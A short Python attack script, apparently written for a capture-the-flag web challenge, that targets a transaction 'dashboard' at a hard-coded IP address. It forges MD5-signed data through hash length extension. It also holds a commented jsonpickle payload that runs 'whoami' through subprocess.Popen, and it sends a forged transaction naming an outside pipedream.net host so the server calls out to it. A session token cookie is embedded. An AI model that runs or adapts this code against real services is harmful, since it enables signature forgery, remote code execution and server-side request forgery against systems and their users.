from pymd5 import md5, padding
from json import loads, dumps
from base64 import b64encode, b64decode
import requests

txn = "eyJkYXRhIjoiZXlKMGVHNWZhV1FpT2lJMllqSTFPRE0wWlRFNU1XWXlaR1ZpWkdVeU1tSmpabVExT0RrMk56Rm1aQ0lzSW5SNGJsOXpaWEoyWlhJaU9pSnViMlJsTVNKOSIsImNoYWxsZW5nZSI6ImI1NGE5YjBhY2Q4MWFiNTg3ZWNiZDc4ZDhjZjAzMTY1In0="
txn_json = loads(b64decode(txn))

original_message = txn_json['data'].decode('base64')
appended_message = '{"test": "test"}'
original_digest = txn_json['challenge']
# print(original_message, len(original_message), original_digest)

extended_hash = md5(state=original_digest.decode("hex"), count=512*2)
extended_hash.update(appended_message)
extended_digest = extended_hash.hexdigest()

# "py/object": "__main__.Shell", "py/reduce": [{"py/type": "subprocess.Popen"}, {"py/tuple": ["whoami"]}, null, null, null]
# txn_json['py/object'] = "__main__.Shell"
# txn_json['py/reduce'] = [{"py/type": "subprocess.Popen"}, {"py/tuple": ["whoami"]}, None, None, None]

secret_len = 0
# txn_json['challenge'] = extended_digest
while True:
  # new_data = original_message + padding((len(original_message) + secret_len) * 8) + appended_message
  # txn_json['data'] = b64encode(new_data)
  # print(secret_len, txn_json)
  # print(dumps(txn_json))

  # print(txn_json['data'])
  payload = '{"data": "%s", "challenge": 0}' % (b64encode('{ "txn_id": "6b25834e191f2debde22bcfd589671fd","txn_server":"enk8fifolhz3871.m.pipedream.net/"}'))
  print(b64encode(payload))
  r = requests.post('http://165.22.122.9/dashboard', data = {
    'txn': b64encode(payload),
    'to_wallet': "43e6084bec88d7875cc7ae9e9d52c240",
    'amount': 0
  }, cookies={
    'token': 'NzM2ZjhhNTBiNTNlZGYyZWI4NGZiMDcwYWVlMjZjNjEwZjVjOGRjM2IzMDU3ZTk4YzU1ZTE1ZDAxZmNmZWM1ZTAyZjZlY2IzNzYzYjQ5MzYyNmM4MTMzNDgxNDkwODJjMzI4NWFlYzA5YzllZTE2ZjQyMjQ5NWNhYWRhYjJiZmY%3D'
  }, allow_redirects=False)

  print(r.status_code)
  print(r.headers)
  print(r.text)
  break
  if not 'Transaction tampering detected' in r.text:
    break

  secret_len += 1

# print(secret_len)
